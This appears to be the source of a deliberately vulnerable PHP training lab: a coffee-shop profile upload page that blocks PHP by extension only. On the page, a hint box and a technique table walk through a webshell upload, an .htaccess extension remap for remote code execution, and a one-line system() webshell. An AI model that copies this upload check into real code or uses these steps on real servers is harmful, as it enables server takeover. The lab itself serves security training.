<?php
/**
 * ══════════════════════════════════════════════════
 * VULNERABILITY #2: Unrestricted File Upload
 * Lab: Profile Image Upload
 *
 * Vuln A: PHP files are blacklisted by extension only.
 *         Uploading shell.lol bypasses the check.
 *
 * Vuln B: Uploading an .htaccess file containing:
 *         AddType application/x-httpd-php .lol
 *         makes Apache execute .lol files as PHP → RCE.
 *
 * Upload dir: /var/www/html/shop/uploads/
 * Access:     http://breuta.co/shop/uploads/<filename>
 * ══════════════════════════════════════════════════
 */

$upload_dir = '/var/www/html/shop/uploads/';
$upload_url = '/shop/uploads/';

$message = '';
$type    = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['profile_image'])) {
    $file     = $_FILES['profile_image'];
    $filename = basename($file['name']);
    $ext      = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $dest     = $upload_dir . $filename;

    // ⚠️  INTENTIONALLY VULNERABLE blacklist (easy to bypass)
    $blacklisted = ['php', 'php3', 'php4', 'php5', 'phtml', 'php7'];

    if (in_array($ext, $blacklisted)) {
        $message = "❌ Error: PHP files are not allowed for security reasons.";
        $type    = 'danger';
    } elseif ($file['error'] !== UPLOAD_ERR_OK) {
        $message = "❌ Upload error: " . $file['error'];
        $type    = 'danger';
    } else {
        // BUG: No MIME type check, no content inspection
        // .lol, .jpg, .htaccess etc. all pass through
        if (move_uploaded_file($file['tmp_name'], $dest)) {
            $message = "✅ File uploaded successfully: <a href='{$upload_url}{$filename}'>{$filename}</a>";
            $type    = 'success';
        } else {
            $message = "❌ Failed to move uploaded file. Check permissions.";
            $type    = 'danger';
        }
    }
}

// List uploaded files
$uploaded_files = array_diff(scandir($upload_dir), ['.', '..']);
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Profile Upload | Breuta Coffee</title>
<link rel="stylesheet" href="/assets/css/style.css">
</head>
<body>
<?php include '/var/www/html/includes/navbar.php'; ?>

<div class="page-header">
  <div class="container">
    <h1>📂 Profile Image Upload</h1>
    <p>Upload your coffee profile picture (JPG, PNG, GIF allowed)</p>
  </div>
</div>

<div class="container">

  <div class="vuln-hint">
    <h4>🧑‍🎓 Lab Exercise: Unrestricted File Upload</h4>
    <p>The server blocks <code>.php</code> extensions but only checks the file extension.<br>
    Try uploading a PHP webshell with an allowed extension like <code>.lol</code> or <code>.jpg</code>.</p>
    <p style="margin-top:.5rem;"><strong>Bonus:</strong> Upload an <code>.htaccess</code> file to remap extensions!</p>
  </div>

  <?php if ($message): ?>
    <div class="alert alert-<?= $type ?>"><?= $message ?></div>
  <?php endif; ?>

  <div class="card">
    <h2>Upload Profile Image</h2>
    <form method="POST" enctype="multipart/form-data">
      <div class="upload-box">
        <p style="font-size:3rem;">📸</p>
        <p>Drag and drop or click to upload</p>
        <p style="color:#999; font-size:.85rem;">Allowed: JPG, PNG, GIF (max 10MB)</p>
        <input type="file" name="profile_image" required style="margin-top:1rem;">
      </div>
      <button type="submit" style="margin-top:1rem; width:100%;">Upload File</button>
    </form>
  </div>

  <div class="card">
    <h2>📁 Uploaded Files</h2>
    <?php if (empty($uploaded_files)): ?>
      <p style="color:#999;">No files uploaded yet.</p>
    <?php else: ?>
      <table>
        <tr><th>Filename</th><th>Size</th><th>Action</th></tr>
        <?php foreach ($uploaded_files as $f):
            $fpath = $upload_dir . $f;
            $fsize = round(filesize($fpath) / 1024, 2) . ' KB';
        ?>
        <tr>
          <td><?= htmlspecialchars($f) ?></td>
          <td><?= $fsize ?></td>
          <td><a href="<?= $upload_url . rawurlencode($f) ?>" target="_blank">Open ↗</a></td>
        </tr>
        <?php endforeach; ?>
      </table>
    <?php endif; ?>
  </div>

  <div class="card">
    <h2>💡 Attack Techniques</h2>
    <table>
      <tr><th>Technique</th><th>Steps</th></tr>
      <tr>
        <td>Extension bypass</td>
        <td>Create <code>shell.lol</code> with PHP code, upload → open in browser</td>
      </tr>
      <tr>
        <td>.htaccess RCE</td>
        <td>
          1. Upload <code>.htaccess</code> containing:<br>
          <code>AddType application/x-httpd-php .lol</code><br>
          2. Then upload <code>shell.lol</code> with PHP webshell<br>
          3. Browse to <code>/shop/uploads/shell.lol?cmd=id</code>
        </td>
      </tr>
      <tr>
        <td>Sample webshell</td>
        <td><code>&lt;?php system($_GET['cmd']); ?&gt;</code></td>
      </tr>
    </table>
  </div>

</div>

<?php include '/var/www/html/includes/footer.php'; ?>
<script src="/assets/js/main.js"></script>
</body>
</html>
